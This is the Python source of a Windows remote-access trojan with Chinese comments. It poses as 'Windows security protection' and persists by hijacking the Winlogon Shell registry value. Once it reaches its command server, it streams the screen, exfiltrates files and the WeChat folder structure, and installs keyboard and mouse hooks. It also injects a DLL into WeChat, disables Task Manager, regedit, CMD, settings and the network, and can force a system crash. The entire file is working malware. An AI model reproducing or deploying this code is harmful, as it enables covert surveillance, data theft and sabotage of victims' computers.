import socket,threading,json,pyautogui,os,base64,shutil,mss,time,sys,subprocess,signal,ctypes,psutil,io,struct,sqlite3
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import numpy as np
from PIL import Image, ImageDraw
from pathlib import Path
import numpy.linalg
import winreg as reg
import win32com.client

# 禁用 fail-safe
pyautogui.FAILSAFE = False

def Destroy_Process():
            
    pid = os.getpid() # 获取当前进程的PID
    os.kill(pid, signal.SIGTERM)

def create_db_and_table(db_name):
    # 连接到 SQLite 数据库 (如果数据库不存在，会自动创建)
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()
    
    # 创建一个表，用来存储服务器 IP 地址
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS server_info (
        id INTEGER PRIMARY KEY,
        ip_address TEXT
    )
    ''')

    # 提交并关闭数据库连接
    conn.commit()
    conn.close()

def get_or_create_ip(db_name):
    # 连接到 SQLite 数据库
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()

    # 查询是否有 IP 地址
    cursor.execute('SELECT ip_address FROM server_info WHERE id = 1')
    result = cursor.fetchone()

    # 如果没有记录，创建一条空的 IP 地址
    if result is None:
        cursor.execute('INSERT INTO server_info (id, ip_address) VALUES (1, "")')
        conn.commit()
    elif result[0] == "":
        Destroy_Process()
    else:
        return result[0]

    # 关闭数据库连接
    conn.close()

# 获取本机的主机名
hostname = socket.gethostname()

# 获取本机的局域网 IP 地址
ip_address = socket.gethostbyname(hostname)

Disrunning = False # 运行状态

monitor_status = False # 被监控状态

init_screen = False # 初始画面

path = f"C:\\Windows\\chong\\screen\\pictrue\\{ip_address}.png"

old_path = f"C:\\Windows\\chong\\screen\\pictrue\\old_picture.png"

new_path = f"C:\\Windows\\chong\\screen\\pictrue\\new_picture.png"

picture_discrepancy = f"C:\\Windows\\chong\\screen\\pictrue\\discrepancy.png"

def set_process_name(new_name):
    """
    修改当前进程的名称。
    """
    try:
        # 获取当前进程的 PID
        pid = os.getpid()

        # 获取当前进程的句柄
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        handle = kernel32.OpenProcess(0x1F0FFF, False, pid)

        # 修改进程名称
        kernel32.SetConsoleTitleW(new_name)
        
    except Exception as e:
        pass

# 修改进程名称
set_process_name("Windows 安全防护")

def send_msg(sock, msg):
    """发送消息"""
    # 计算消息长度
    msglen = len(msg)
    # 将消息长度编码为4个字节的二进制数据
    msglen_bytes = msglen.to_bytes(4, byteorder='little')
    # 发送消息长度
    sock.sendall(msglen_bytes)
    # 发送消息内容
    sock.sendall(msg)

def recv_msg(sock):
    """接收信息"""
    # 先接收4个字节的消息长度
    raw_msglen = sock.recv(4)
    if not raw_msglen:
        return None
    # 将消息长度解码为整数
    msglen = int.from_bytes(raw_msglen, byteorder='little')
    # 接收实际的消息内容
    msg = b''
    while len(msg) < msglen:
        chunk = sock.recv(msglen - len(msg))
        if not chunk:
            return None
        msg += chunk
    return msg

def handle_client(conn):
    """处理客户端消息"""
    # 接收消息
    data = recv_msg(conn)
    if not data:
        return
    # 处理消息
    message = data.decode()
    return message

def rename_file(source, target):
    try:
        # 使用 shutil.move 来重命名并覆盖文件
        shutil.move(source, target)
        
    except Exception as e:
        pass

def find_process_id(process_name):
    """
    根据进程名查找进程 ID
    :param process_name: 进程名（如 notepad.exe）
    :return: 进程 ID
    """
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None

def collapse_wechat():

    try:

        # 目标进程的ID
        target_process_id = find_process_id("WeChat.exe")

        # DLL的路径
        dll_path = "c.dll"

        # 打开目标进程
        process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, target_process_id)

        # 在目标进程中申请内存空间
        memory_address = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, len(dll_path), 0x3000, 0x40)

        # 将DLL路径写入目标进程的内存空间
        ctypes.windll.kernel32.WriteProcessMemory(process_handle, memory_address, dll_path, len(dll_path), 0)

        # 在目标进程中加载DLL
        thread_handle = ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, ctypes.windll.kernel32.GetProcAddress(ctypes.windll.kernel32.GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), memory_address, 0, None)

        # 等待DLL加载完成
        ctypes.windll.kernel32.WaitForSingleObject(thread_handle, -1)

        # 关闭目标进程的句柄
        ctypes.windll.kernel32.CloseHandle(process_handle)

    except:
        pass

def self_starting():
    """自启动"""

    copy_file(get_path("run.vbs"), "C:\\Windows\\run.vbs")

    # 注册表路径
    reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    # 你要设置的值的名称
    value_name = "Shell"
    # 新的值（比如你要设置为新的 shell）
    new_value = 'explorer.exe, wscript.exe "C:\\Windows\\run.vbs"'  # 举例，设置为 Explorer

    # 打开注册表键值
    try:
        # 以读写模式打开注册表
        reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, reg_path, 0, reg.KEY_SET_VALUE)

        # 设置注册表项的值
        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, new_value)
        
        # 关闭注册表键
        reg.CloseKey(reg_key)
    except PermissionError:
        pass
    except Exception as e:
        pass

def self_starting_all():
    """自启动+入侵"""

    copy_file(get_path("runall.vbs"), "C:\\Windows\\runall.vbs")

    # 注册表路径
    reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    # 你要设置的值的名称
    value_name = "Shell"
    # 新的值（比如你要设置为新的 shell）
    new_value = 'wscript.exe "C:\\Windows\\runall.vbs"'  # 举例，设置为 Explorer

    # 打开注册表键值
    try:
        # 以读写模式打开注册表
        reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, reg_path, 0, reg.KEY_SET_VALUE)

        # 设置注册表项的值
        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, new_value)
        
        # 关闭注册表键
        reg.CloseKey(reg_key)
    except PermissionError:
        pass
    except Exception as e:
        pass

def save_screenshot(save_path):
    # 获取文件保存的目录路径
    directory = os.path.dirname(save_path)

    # 如果目录不存在，则创建该目录
    if not os.path.exists(directory):
        os.makedirs(directory)

    # 截取全屏
    screenshot = pyautogui.screenshot()

    # 保存截图
    screenshot.save(save_path)

def list_files_tree(folder_path, output_file, level=0):
    """递归获取文件夹的所有文件，并以树状结构写入txt文件"""
    
    try:
        # 获取文件夹内的文件和子文件夹
        items = os.listdir(folder_path)
    except PermissionError:
        return  # 如果没有权限访问某个文件夹，跳过
    
    for item in items:
        item_path = os.path.join(folder_path, item)
        
        # 写入树状结构
        if os.path.isdir(item_path):  # 如果是文件夹
            output_file.write("    " * level + f"[{item}]\n")  # 文件夹用[]表示
            list_files_tree(item_path, output_file, level + 1)  # 递归处理子文件夹
        else:  # 如果是文件
            output_file.write("    " * level + f"- {item}\n")  # 文件用-表示

def save_file_tree_to_txt(folder_path, txt_path):
    """获取指定文件夹内的所有文件，并以树状图保存成txt文件"""
    
    with open(txt_path, 'w', encoding='utf-8') as output_file:
        list_files_tree(folder_path, output_file)

def save_screenshot_with_mouse(save_path):

    # 获取文件保存的目录路径
    directory = os.path.dirname(save_path)

    # 如果目录不存在，则创建该目录
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    # 获取屏幕截图
    with mss.mss() as sct:
        screenshot = sct.shot(output=save_path)

    # 获取鼠标位置
    mouse_position = pyautogui.position()

    # 打开截图
    screenshot_image = Image.open(save_path)

    # 画出鼠标位置（白色圆点）
    draw = ImageDraw.Draw(screenshot_image)
    
    # 使用白色实心圆点表示鼠标位置
    draw.ellipse([(mouse_position[0] - 5, mouse_position[1] - 5),
                  (mouse_position[0] + 5, mouse_position[1] + 5)], fill="red")

    # 保存包含鼠标的截图
    screenshot_image.save(save_path)

def compare_images_fast(old_image_path, new_image_path, output_path):
    
    # 打开旧图片和新图片，转换为 RGBA 模式
    old_image = Image.open(old_image_path).convert("RGBA")
    new_image = Image.open(new_image_path).convert("RGBA")

    # 转换为 numpy 数组
    old_pixels = np.array(old_image)
    new_pixels = np.array(new_image)

    # 比较两张图片，返回一个布尔矩阵，标记出像素是否有变化
    diff_mask = np.any(old_pixels != new_pixels, axis=-1)  # axis=-1 表示在最后一维（RGBA）上比较

    # 创建一个全透明的差异图像
    diff_image = np.zeros_like(old_pixels)

    # 仅在有差异的位置，填充新图像的像素
    diff_image[diff_mask] = new_pixels[diff_mask]

    # 将差异图像转换为图片
    result_image = Image.fromarray(diff_image, 'RGBA')

    # 保存结果图像为 PNG 格式
    result_image.save(output_path, "PNG")

def capture_and_send_screen():
    
    # 捕获屏幕截图
    screenshot = pyautogui.screenshot()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_data = img_byte_arr.getvalue()

    # 捕获鼠标位置
    mouse_x, mouse_y = pyautogui.position()

    # 发送图像数据的长度（4字节）
    client_socket.sendall(struct.pack('>I', len(img_data)))

    # 发送鼠标位置（8字节：x 和 y 各 4 字节）
    client_socket.sendall(struct.pack('>II', mouse_x, mouse_y))

    # 发送图像数据
    client_socket.sendall(img_data)

def monitor():
    """监控"""

    global monitor_status,init_screen

    while True:

        if Disrunning:
            break
        else:

            try:

                if monitor_status:

                    if init_screen:

                        capture_and_send_screen()

                    else:                        

                        request = {
                            "operation": "监控初始画面"
                        }

                        send_msg(c, (json.dumps(request)).encode("utf-8"))

                        init_screen = True

                        client_socket.connect((ip, monitor_port)) # 连接

                else:
                    break

            except:
                continue

def get_path(path):
    
    # 如果是打包后的程序
    if getattr(sys, 'frozen', False):
        
        # 获取临时文件夹路径
        base_path = sys._MEIPASS
        
        # 获取 l.exe 的路径
        l_exe_path = os.path.join(base_path, path)
        
    else:
        
        # 如果是开发模式，l.exe 在当前目录
        l_exe_path = os.path.join(os.path.dirname(__file__), path)
    
    return l_exe_path

def copy_file(src, dst):
    try:
        # 如果目标文件夹不存在，则创建它
        if not os.path.exists(os.path.dirname(dst)):
            os.makedirs(os.path.dirname(dst))
        
        # 使用 shutil.copy 复制文件
        shutil.copy(src, dst)

    except FileNotFoundError:
        pass
    
    except Exception as e:
        pass

def restart_program():
    """重启程序"""
    
    python = sys.executable
    subprocess.Popen([python] + sys.argv)

def set_task_manager_status(disable=True):
    """设置任务管理器状态"""
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    value_name = "DisableTaskMgr"
    value = 1 if disable else 0
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, value)
        reg.CloseKey(key)
    except Exception as e:
        pass

def disable_cmd():
    """禁用命令提示符"""
    
    key_path = r"Software\Policies\Microsoft\Windows\System"
    value_name = "DisableCMD"

    try:
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
    except Exception as e:
        pass

def enable_cmd():
    """启用命令提示符"""
    
    key_path = r"Software\Policies\Microsoft\Windows\System"
    value_name = "DisableCMD"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, 0)
        reg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception as e:
        pass

def disable_compmgmt():
    """禁用计算机管理"""
    key_path = r"Software\Policies\Microsoft\MMC\{58221C67-EA27-11CF-ADCF-00AA00A80033}"
    value_name = "Restrict_Run"

    try:
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
    except Exception as e:
        pass

def enable_compmgmt():
    """启用计算机管理"""
    key_path = r"Software\Policies\Microsoft\MMC\{58221C67-EA27-11CF-ADCF-00AA00A80033}"
    value_name = "Restrict_Run"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, 0)
        reg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception as e:
        pass

def disable_regedit():
    """禁用注册表编辑器"""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    value_name = "DisableRegistryTools"

    try:
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
    except Exception as e:
        pass

def enable_regedit():
    """启用注册表编辑器"""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    value_name = "DisableRegistryTools"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, 0)
        reg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception as e:
        pass

def disable_settings():
    """禁用设置"""

    # 打开注册表项
    key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, reg.KEY_WRITE)

    # 设置值以禁用控制面板
    reg.SetValueEx(key, "NoControlPanel", 0, reg.REG_DWORD, 1)

    # 关闭注册表项
    reg.CloseKey(key)

def enable_settings():
    """启用设置"""

    # 打开注册表项
    key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, reg.KEY_WRITE)

    # 删除或重置值以恢复控制面板
    try:
        reg.DeleteValue(key, "NoControlPanel")
    except FileNotFoundError:
        pass

    # 关闭注册表项
    reg.CloseKey(key)

def disable_network():
    """禁用网络"""

    # 获取网络适配器
##    wmi = win32com.client.GetObject("winmgmts:")
    wmi = win32com.client.GetObject("winmgmts://./root/cimv2")
    adapters = wmi.InstancesOf("Win32_NetworkAdapter")

    # 遍历适配器并启用指定适配器
    for adapter in adapters:
        try:
            adapter.Disable()  # 确保 adapter 是一个 Win32_NetworkAdapter 对象
        except:
            pass

def enable_network():
    """启用网络"""

    # 获取网络适配器
##    wmi = win32com.client.GetObject("winmgmts:")
    wmi = win32com.client.GetObject("winmgmts://./root/cimv2")
    adapters = wmi.InstancesOf("Win32_NetworkAdapter")

    # 遍历适配器并启用指定适配器
    for adapter in adapters:
        try:
            adapter.Enable()  # 确保 adapter 是一个 Win32_NetworkAdapter 对象
        except:
            pass

def get_all_adapters():
    """获取所有网络适配器的名称"""
    
    try:
        # 获取网络适配器列表
        result = subprocess.Popen('netsh interface show interface', shell=True, text=True, capture_output=True, check=True)
        output = result.stdout
        
        # 提取适配器名称
        adapters = []
        for line in output.splitlines():
            if "已启用" in line or "已禁用" in line:
                parts = line.split()
                adapter_name = parts[3]  # 适配器名称通常在第四列
                adapters.append(adapter_name)
        
        return adapters

    except subprocess.CalledProcessError as e:
        print(f"获取网络适配器时出错: {e}")
        return []

def disable_network_adapter():
    """禁用所有网络适配器"""
    adapters = get_all_adapters()
    if not adapters:
        return
    
    for adapter in adapters:
        try:
            subprocess.Popen(f'netsh interface set interface "{adapter}" disable', shell=True, check=True)
        except subprocess.CalledProcessError as e:
            pass

def enable_network_adapter():
    """启用所有网络适配器"""
    adapters = get_all_adapters()
    if not adapters:
        return
    
    for adapter in adapters:
        try:
            subprocess.Popen(f'netsh interface set interface "{adapter}" enable', shell=True, check=True)
        except subprocess.CalledProcessError as e:
            pass

def limit_speed():
    """限制网速"""

    subprocess.Popen([
        "powershell.exe",
        "New-NetQosPolicy -Name 'LimitEdgeBandwidth' -ThrottleRateActionBitsPerSecond 1KB -AppPathNameMatchCondition 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'"
    ], shell=True)

def relieve_speed():
    """解除网速限制"""

    # 删除带宽限制策略
    subprocess.Popen([
        "powershell.exe",
        "Remove-NetQosPolicy -Name 'LimitEdgeBandwidth' -Confirm:$false"
    ], shell=True)

def kill_process_by_name(process_name):
    
    for proc in psutil.process_iter(['pid', 'name']):
        
        if proc.info['name'] == process_name:
            
            proc.kill()  # 无提示强制关闭

def simulate_keys(input_string):
    """根据输入的字符串模拟按键按下和释放，支持修饰键"""
    for char in input_string:
        
        # 判断是否是修饰键（如 Ctrl, Shift, Alt 等）
        if char == "Control_L" or char == "Control_R":
            pyautogui.keyDown('ctrl')
        elif char == "Shift_L" or char == "Shift_R":
            pyautogui.keyDown('shift')
        elif char == "Alt_L" or char == "Alt_R":
            pyautogui.keyDown('alt')
        else:
            # 普通键按下
            pyautogui.keyDown(char)
                
        # 释放按键
        if char == "Control_L" or char == "Control_R":
            pyautogui.keyUp('ctrl')
        elif char == "Shift_L" or char == "Shift_R":
            pyautogui.keyUp('shift')
        elif char == "Alt_L" or char == "Alt_R":
            pyautogui.keyUp('alt')            
        else:
            # 普通键释放
            pyautogui.keyUp(char)

def read_server(c):
    """接收服务器发送的信息"""

    global monitor_status,init_screen,path,Disrunning,client_socket,client_socket

    while True:
                
        try:
            content = handle_client(c)

            request = json.loads(content)
    
            operation = request.get("operation")
            
        except ConnectionResetError:

            c.close() #关闭套接字

            monitor_status = False # 被监控状态

            init_screen = False # 初始画面

            # 文件夹路径
            folder_path = 'C:\\Windows\\chong'

            try:
                # 删除文件夹及其所有内容
                shutil.rmtree(folder_path)
            except:
                pass

            Disrunning = True

            # 重新启动当前脚本
##            subprocess.call([sys.executable] + sys.argv)

            Destroy_Process()

            break
            return
                
        else:

            if operation == "关机":

                os.system("shutdown /p")

            elif operation == "截屏":

                # 截图
                save_screenshot(path)

                send_picture("图片", path)

            elif operation == "桌面":

                pyautogui.hotkey('win', 'd')

            elif operation == "监控开":

                monitor_status = True

                threading.Thread(target = monitor).start()

            elif operation == "监控关":

                monitor_status = False

                init_screen = False

                client_socket.close()

                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            elif operation == "微信树状图":

                # 指定文件夹路径和输出txt文件路径
                folder_path = 'C:\\Users\\Administrator\\Documents\\WeChat Files'  # 修改为你要遍历的文件夹路径
                txt_path = 'C:\\Windows\\folder_structure.txt'      # 输出的txt文件路径

                # 判断文件夹是否存在
                if os.path.isdir(folder_path):

                    # 调用函数保存文件夹树状结构
                    save_file_tree_to_txt(folder_path, txt_path)

                    send_picture("微信树状图", txt_path)
                    
                else:

                    request = {
                        "operation": "路径不存在"
                    }

                    send_msg(c, (json.dumps(request)).encode("utf-8"))

            elif operation == "可用磁盘":

                drives = []
                # 通过 os 模块获取系统的磁盘
                if os.name == 'nt':  # Windows 系统
                    for drive in range(65, 91):  # A:到Z:的字母
                        drive_letter = chr(drive) + ":\\"
                        if os.path.exists(drive_letter):
                            drives.append(drive_letter)

                request = {
                    "operation": "可用磁盘",
                    "list" : drives
                }

                send_msg(c, (json.dumps(request)).encode("utf-8"))

            elif operation == "刷新文件列表":

                path0 = request.get("path")

                # 显示当前路径下的文件和文件夹
                items = os.listdir(path0)

                deal_items = [] # 处理后的列表

                for item in items:

                    full_path = os.path.join(path0, item)

                    path = Path(full_path)

                    file_size = convert_size(path.stat().st_size) # 文件大小

                    # 判断路径是否是文件
                    if path.is_file():
                        display_item = f"【文件】 {item}（{file_size}）"  # 文件夹前加 [文件夹]
                        
                    # 判断路径是否是目录
                    elif path.is_dir():
                        display_item = f"【文件夹】 {item}"  # 文件前加 [文件]
                        
                    else:
                        display_item = f"【未知】 {item}"  # 文件前加 [文件]

                    deal_items.append(display_item)

                request = {
                    "operation": "刷新文件列表",
                    "list" : deal_items
                }

                send_msg(c, (json.dumps(request)).encode("utf-8"))

            elif operation == "桌面路径":

                try:
                    # 获取桌面路径
                    desktop_path = str(Path.home() / "Desktop")
                
                    if os.path.exists(desktop_path):

                        request = {
                            "operation": "桌面路径",
                            "path" : desktop_path
                        }
                                                
                    else:

                        request = {
                            "operation": "桌面路径",
                            "path" : "不存在"
                        }
                        
                except Exception as e:

                    request = {
                        "operation": "桌面路径",
                        "path" : "不存在"
                    }

                send_msg(c, (json.dumps(request)).encode("utf-8"))

            elif operation == "获取文件":

                path = request.get("path")

                send_file(path)

            elif operation == "系统崩溃":

                c.close()

                # 调用Windows API使系统崩溃
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

            elif operation == "禁用任务管理器":

                set_task_manager_status(disable=True)  # 禁用任务管理器

            elif operation == "启用任务管理器":

                set_task_manager_status(disable=False)  # 启用任务管理器

            elif operation == "禁用任务管理器":

                disable_cmd()  # 禁用命令提示符

            elif operation == "启用任务管理器":

                enable_cmd()  # 启用命令提示符

            elif operation == "禁用计算机管理":

                disable_compmgmt()  # 禁用计算机管理

            elif operation == "启用计算机管理":

                enable_compmgmt()  # 启用计算机管理

            elif operation == "禁用注册表编辑器":

                disable_regedit()  # 禁用注册表编辑器

            elif operation == "启用注册表编辑器":

                enable_regedit()  # 启用注册表编辑器

            elif operation == "禁用设置":

                disable_settings()  # 禁用设置

            elif operation == "启用设置":

                enable_settings()  # 启用设置

            elif operation == "禁用网络":

                c.close()

                disable_network_adapter() # 禁用网络

            elif operation == "启用网络":

                enable_network_adapter() # 禁用网络

            elif operation == "进程列表":

                process = []

                for proc in psutil.process_iter(['pid', 'name', 'status', 'memory_info', 'exe', 'cmdline']):

                        pid = proc.info['pid']
                        name = proc.info['name']
                        status = proc.info['status']
                        memory = proc.info['memory_info'].rss / (1024 * 1024)  # 转换为MB
                        exe = proc.info.get('exe', None)  # 默认值为 None
                        cmdline = proc.info.get('cmdline', None)  # 默认值为 None

                        process.append([pid, name, status, memory, exe, cmdline])

                request = {
                    "operation": "进程列表",
                    "list" : process
                }

                send_msg(c, (json.dumps(request)).encode("utf-8"))

            elif operation == "终止进程":

                pid = request.get("pid")

                proc = psutil.Process(pid)
                proc.terminate()

            elif operation == "关闭上层窗口":

                pyautogui.hotkey('alt', 'f4')

            elif operation == "限制edge网速":

                limit_speed()

            elif operation == "解除限制edge网速":

                relieve_speed()

            elif operation == "挂起微信":

                copy_file(get_path("Hwechat.exe"), "C:\\Windows\\addins\\Hwechat.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Hwechat.exe",)).start()

            elif operation == "挂起edge":

                copy_file(get_path("Hedge.exe"), "C:\\Windows\\addins\\Hedge.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Hedge.exe",)).start()

            elif operation == "挂起vmware":

                copy_file(get_path("Hvmware.exe"), "C:\\Windows\\addins\\Hvmware.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Hvmware.exe",)).start()

            elif operation == "挂起explorer":

                copy_file(get_path("Hexplorer.exe"), "C:\\Windows\\addins\\Hexplorer.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Hexplorer.exe",)).start()

            elif operation == "挂起wps":

                copy_file(get_path("Hwps.exe"), "C:\\Windows\\addins\\Hwps.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Hwps.exe",)).start()

            elif operation == "挂起chrome":

                copy_file(get_path("Hchrome.exe"), "C:\\Windows\\addins\\Hchrome.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Hchrome.exe",)).start()

            elif operation == "挂起word":

                copy_file(get_path("Hword.exe"), "C:\\Windows\\addins\\Hword.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Hword.exe",)).start()

            elif operation == "挂起所有":

                copy_file(get_path("Hall.exe"), "C:\\Windows\\addins\\Hall.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Hall.exe",)).start()

            elif operation == "添加鼠标钩子":

                copy_file(get_path("Windows Mouse.exe"), "C:\\Windows\\addins\\Windows Mouse.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Windows Mouse.exe",)).start()

            elif operation == "移除鼠标钩子":

                kill_process_by_name('Windows Mouse.exe')

            elif operation == "添加键盘钩子":

                copy_file(get_path("Windows Key.exe"), "C:\\Windows\\addins\\Windows Key.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Windows Key.exe",)).start()

            elif operation == "移除键盘钩子":

                kill_process_by_name('Windows Key.exe')

            elif operation == "微信崩溃":

                collapse_wechat()

            elif operation == "入侵计算机":

                self_starting_all()

                copy_file(get_path("g.jpg"), "C:\\Windows\\PLA\\g.jpg")

                copy_file(get_path("l.exe"), "C:\\Windows\\addins\\l.exe")

                copy_file(get_path("Windows Key.exe"), "C:\\Windows\\addins\\Windows Key.exe")

                copy_file(get_path("Windows Mouse.exe"), "C:\\Windows\\addins\\Windows Mouse.exe")

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Windows Key.exe",)).start()

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\Windows Mouse.exe",)).start()

                threading.Thread(target = start_app, args=("C:\\Windows\\addins\\l.exe",)).start()

            elif operation == "取消入侵":

                self_starting()

                kill_process_by_name('Windows Key.exe')

                kill_process_by_name('Windows Mouse.exe')

                kill_process_by_name('l.exe')

            elif operation == "单击":

                click_x = request.get("x")

                click_y = request.get("y")

                pyautogui.click(x=click_x, y=click_y)

            elif operation == "更新鼠标位置":

                click_x = request.get("x")

                click_y = request.get("y")

                threading.Thread(target = lambda click_x=click_x,click_y=click_y  : pyautogui.moveTo(click_x, click_y)).start()

            elif operation == "右击":

                click_x = request.get("x")

                click_y = request.get("y")

                pyautogui.rightClick(x=click_x, y=click_y)

            elif operation == "滚动上":

                threading.Thread(target = lambda : pyautogui.scroll(120)).start()

            elif operation == "滚动下":

                threading.Thread(target = lambda : pyautogui.scroll(-120)).start()

            elif operation == "左键按下":

                # 按下鼠标左键
                pyautogui.mouseDown()

            elif operation == "左键松开":

                # 松开鼠标左键
                pyautogui.mouseUp()

            elif operation == "按键":

                key = request.get("key")

                # 调用模拟按键函数
                threading.Thread(target = lambda : simulate_keys([key])).start()

            elif operation == "消息弹窗":

                title = request.get("title")

                content = request.get("content")

                threading.Thread(target = lambda : dis_info(title,content)).start()

            elif operation == "警告弹窗":

                title = request.get("title")

                content = request.get("content")

                threading.Thread(target = lambda : dis_warn(title,content)).start()

            elif operation == "错误弹窗":

                title = request.get("title")

                content = request.get("content")

                threading.Thread(target = lambda : dis_error(title,content)).start()
                

def dis_info(title, content):
    messagebox.showinfo(title,content)

def dis_warn(title, content):
    messagebox.showwarning(title,content)

def dis_error(title, content):
    messagebox.showerror(title,content)
                
def convert_size(size_in_bytes):
    
    # 定义常用单位
    units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']
    
    # 如果文件大小为0，直接返回 0 B
    if size_in_bytes == 0:
        return "0 B"
    
    # 计算文件大小对应的单位
    size = size_in_bytes
    unit_index = 0
    
    # 将字节转换为更大的单位
    while size >= 1024 and unit_index < len(units) - 1:
        size /= 1024.0
        unit_index += 1
    
    # 返回格式化后的文件大小和单位
    return f"{size:.2f} {units[unit_index]}"

def start_app(path):
    """打开应用程序"""

    subprocess.Popen([path])

def send_picture(event, picture_path):
    """发送图片"""

    with open(picture_path, "rb") as img_file:

        encoded_image = base64.b64encode(img_file.read()).decode('utf-8')

        request = {
            "operation": event,
            "code": encoded_image,
            "ip" : ip_address,
        }

        send_msg(c, (json.dumps(request)).encode("utf-8"))

def send_file(picture_path):
    """发送文件"""

    picture_path = picture_path[:picture_path.rfind("（")]

    file_path = Path(picture_path)  # 替换为你指定的文件路径
    file_name = file_path.name  # 文件名

    with open(picture_path, "rb") as img_file:

        encoded_image = base64.b64encode(img_file.read()).decode('utf-8')

        request = {
            "operation": "文件",
            "code": encoded_image,
            "ip" : ip_address,
            "name" : file_name
        }

        send_msg(c, (json.dumps(request)).encode("utf-8"))

port = 52037

port_udp = 3770

monitor_port = 3773

db_name = "C:\\Windows\\Setup\\server_info.db"  # 数据库名称

# 创建数据库和表
create_db_and_table(db_name)

# 获取或创建 IP 地址
ip = get_or_create_ip(db_name)

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建socket对象

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 创建UDP套接字
##c_u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def connect():
    """连接"""

    while True:

        try:
            c.connect((ip,port)) #连接服务器
            
        except:
            continue
        
        else:

            threading.Thread(target = read_server, args = (c,)).start() #开启信息接收线程

            break
        
        time.sleep(1)

copy_file(get_path("WindowsAntivirus.exe"), "C:\\Windows\\Setup\\WindowsAntivirus.exe")
        
connect()
